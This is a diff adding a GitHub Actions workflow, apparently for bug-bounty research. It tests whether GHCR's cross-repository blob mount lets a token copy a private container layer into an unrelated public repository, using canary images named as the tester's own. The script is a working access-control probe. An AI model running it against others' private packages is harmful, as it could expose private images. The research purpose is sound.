@@ -1,0 +1,49 @@
+name: Owned public repo GHCR cross-repository mount boundary
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  packages: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Publish destination and test private source blob mount
+        env:
+          GHCR_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GHCR_ACTOR: ${{ github.actor }}
+        run: |
+          set -euo pipefail
+          dest='alardiians/bounty-publicrepo-mount-canary-20260923'
+          source='alardiians/bounty-private-container-canary-20260923'
+          source_digest='sha256:0f2243428db9a52cb3e2f516fd3f4390edff25b6ee4dca57c773bb5fcb139286'
+          mkdir context
+          printf '%s\n' 'PUBLIC_REPO_DESTINATION_ONLY_9ae064452d9f44a6' > context/dest.txt
+          cat > context/Dockerfile <<'DOCKERFILE'
+          FROM scratch
+          LABEL org.opencontainers.image.source="https://github.com/Alardiians/pages-boundary-lab-20260923"
+          COPY dest.txt /dest.txt
+          DOCKERFILE
+          docker build -t "ghcr.io/$dest:latest" context >/dev/null
+          printf '%s' "$GHCR_TOKEN" | docker login ghcr.io -u "$GHCR_ACTOR" --password-stdin >/dev/null
+          docker push "ghcr.io/$dest:latest" >/dev/null
+          echo 'destination_publish_success=true'
+          registry_status=$(curl -q -sS --max-time 20 -u "$GHCR_ACTOR:$GHCR_TOKEN" -G 'https://ghcr.io/token' --data-urlencode 'service=ghcr.io' --data-urlencode "scope=repository:$dest:pull,push" --data-urlencode "scope=repository:$source:pull" -o token.json -w '%{http_code}')
+          echo "registry_token_exchange_status=$registry_status"
+          test "$registry_status" = 200
+          registry_token=$(python3 -c 'import json; print(json.load(open("token.json"))["token"])')
+          source_status=$(curl -q -sS --max-time 20 -H "Authorization: Bearer $registry_token" -o source.body -w '%{http_code}' "https://ghcr.io/v2/$source/blobs/$source_digest")
+          echo "pre_mount_private_source_blob_status=$source_status"
+          mount_status=$(curl -q -sS --max-time 20 -X POST -H "Authorization: Bearer $registry_token" -H 'Content-Length: 0' -D mount.headers -o mount.body -w '%{http_code}' "https://ghcr.io/v2/$dest/blobs/uploads/?mount=$source_digest&from=$source")
+          echo "private_source_to_publicrepo_dest_mount_status=$mount_status"
+          if [ "$mount_status" = 201 ]; then
+            dest_status=$(curl -q -sS -L --max-time 20 -H "Authorization: Bearer $registry_token" -o dest.blob -w '%{http_code}' "https://ghcr.io/v2/$dest/blobs/$source_digest")
+            echo "mounted_destination_blob_status=$dest_status"
+            echo "mounted_destination_blob_sha256=$(sha256sum dest.blob | cut -d' ' -f1) bytes=$(wc -c < dest.blob)"
+            if [ "$dest_status" = 200 ] && [ "$(sha256sum dest.blob | cut -d' ' -f1)" = "${source_digest#sha256:}" ]; then
+              echo 'PRIVATE_SOURCE_LAYER_COPIED_TO_UNRELATED_REPOSITORY=true'
+            fi
+          fi
